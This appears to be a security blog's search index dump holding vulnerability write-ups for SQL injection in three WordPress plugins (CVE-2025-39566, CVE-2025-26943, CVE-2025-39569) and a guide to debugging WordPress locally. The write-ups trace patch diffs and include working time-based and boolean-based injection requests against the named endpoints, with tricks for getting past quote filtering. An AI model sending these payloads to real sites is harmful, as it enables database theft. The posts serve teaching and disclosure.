\u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability exists in the Easy Quotes plugin for WordPress prior to version 1.2.3. This could allow attackers to directly interact with your database, including but not limited to data theft.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vulnerable) and v1.2.3(fixed) diff tool: meld or any other tool to compare and see differences between the two versions Analysis The application directly injected user input into an SQL query without using safeguards, leading to an SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference can be found in the file includes/quotes-data.php:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } The patch uses $wpdb-\u0026gt;prepare() instead of directly injecting user input into the query:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } Several other functions were patched the same way, such as: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nAlthough get_fonts_categories() was also patched, it did not handle user input, so it was not a concern:\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it works The SQL Injection resides in get_family_data($family), and similar logic applies to other functions.\nget_family_data() is a private method inside the Quotes_Data class:\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() is called by both get_family() and get_font_variants(). To locate where they’re used, we can search using the keywords get_family or get_font_variants:\nThe method get_font_variants() is invoked in the rest_route_callback_font_variants() method of the Quotes_Rest_Route class:\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action(hook_name, callback) with hook_name set to rest_api_init to register custom endpoints with WordPress’s REST API system.\nThe callback rest_api_init repeatedly uses register_rest_route to create endpoints under the layart/v1 namespace.\nrest_route_callback_font_variants serves as the callback for the endpoint:\n/wp-json/layart/v1/font-variants?family=family_name If no family parameter is provided, the default value is \u0026quot;Shadows Into Light\u0026quot;.\nExploit Detect SQLi We attempt Boolean-based SQL Injection to test whether the family parameter is injectable.\nTrue request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Since AND '1'='1' is always true, the query is valid and returns normal data.\nFalse request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Since AND '1'='2' is always false, the query returns [].\nGet First Letter of Database Name To dump all data, it’s essential to first extract at least one character of the database name.\nIn this case, the database name is wordpress, so the first letter is w.\nThe response returns valid data, confirming the first character is w.\nExecuted query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion The CVE-2025-26943 vulnerability in the WordPress Easy Quotes plugin before version 1.2.3 stems from not using query preparation ($wpdb-\u0026gt;prepare) and directly concatenating user input into SQL statements, leading to SQL Injection.\nThe official patch replaces string concatenation with $wpdb-\u0026gt;prepare, ensuring safer input handling.\nKey takeaways:\nAlways use $wpdb-\u0026gt;prepare() when working with databases in WordPress to prevent SQL Injection. Regularly update plugins and perform security audits to avoid becoming a target. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eThe vulnerability exists in the \u003cstrong\u003eEasy Quotes\u003c/strong\u003e plugin for WordPress prior to version \u003cstrong\u003e1.2.3\u003c/strong\u003e. This could allow attackers to directly interact with your database, including but not limited to data theft.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vulnerable) and v1.2.3(fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any other tool to compare and see differences between the two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application directly injected user input into an SQL query \u003cstrong\u003ewithout using safeguards\u003c/strong\u003e, leading to an SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-26943 Analysis \u0026 POC"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the 